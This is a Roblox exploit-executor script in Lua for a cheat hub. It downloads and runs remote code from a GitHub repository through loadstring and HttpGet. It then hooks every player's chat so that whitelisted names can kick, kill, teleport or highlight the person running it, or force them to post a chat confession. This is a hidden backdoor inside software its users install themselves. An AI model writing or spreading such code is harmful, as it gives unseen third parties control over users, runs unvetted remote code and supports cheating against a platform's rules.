local Modules = loadstring(game:HttpGet("https://raw.githubusercontent.com/hypertext500/Testando/refs/heads/main/Modules/Module.luau"))()
local whiteList = loadstring(game:HttpGet("https://raw.githubusercontent.com/hypertext500/Testando/refs/heads/main/white-list.lua"))()
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local placeId = game.PlaceId
local jobId = game.JobId

if shared.connectionCharacter then
    shared.connectionCharacter:Disconnect()
    shared.connectionCharacter = nil
end

shared.connectionCharacter = LocalPlayer.CharacterAdded:Connect(function(characterNew)
    Character = characterNew
end)




local function funcionaliade(message, player)
    if table.find(whiteList, player.Name) then
            
        if message == "/kickAll" or message == "/kick " .. LocalPlayer.Name then
            LocalPlayer:Kick("Rael hub tá no server")
            task.wait(1)
            TeleportService:TeleportToPlaceInstance(placeId, jobId, LocalPlayer)
        elseif message == "/killAll" or message == "/kill " .. LocalPlayer.Name then
            local humanoid = Character:FindFirstChild("Humanoid")
            if humanoid then humanoid.Health = 0 end
        elseif message == "/confessarAll" or message == "/confessar " .. LocalPlayer.Name then
            Modules.SendInChat("EU USO SCRIPT DO RAEL")
        elseif message == "/bringAll" or message == "/bring " .. LocalPlayer.Name then
            local playerAdm = Players:FindFirstChild(player.Name)
            if playerAdm then
                local characterAdm = playerAdm.Character
                if characterAdm then
                    local playerRoot = Character:FindFirstChild("HumanoidRootPart")
                    local playerRootAdm = characterAdm:FindFirstChild("HumanoidRootPart")
                    if playerRoot and playerRootAdm then
                        playerRoot.CFrame = playerRootAdm.CFrame
                    end
                end
            end
        elseif message == "/destacardonoAll" or message == "/destacardono " .. LocalPlayer.Name then
            local playerAdm = Players:FindFirstChild(player.Name)
            if playerAdm then
                local characterAdm = playerAdm.Character
                if characterAdm then
                    Modules.HighlightPlayer(true, characterAdm, "dono do script")
                end
            end
        elseif message == "/undestacardonoAll" or message == "/undestacardono " .. LocalPlayer.Name then
            local playerAdm = Players:FindFirstChild(player.Name)
            if playerAdm then
                local characterAdm = playerAdm.Character
                if characterAdm then
                    Modules.HighlightPlayer(false, characterAdm, "dono do script")
                end
            end
        end

    end
end

function start_script()

    if table.find(whiteList, LocalPlayer.Name) then warn("ADM detecado") return end

    if not getgenv().RTX321 then
    
        getgenv().RTX321 = true
        for _,  player in ipairs(Players:GetPlayers()) do
    
            player.Chatted:Connect(function(message)
                funcionaliade(message, player)
            end)
    
        end
    
        Players.PlayerAdded:Connect(function(player)
            
            player.Chatted:Connect(function(message)
                funcionaliade(message, player)
            end)
    
        end)
    end

end

start_script()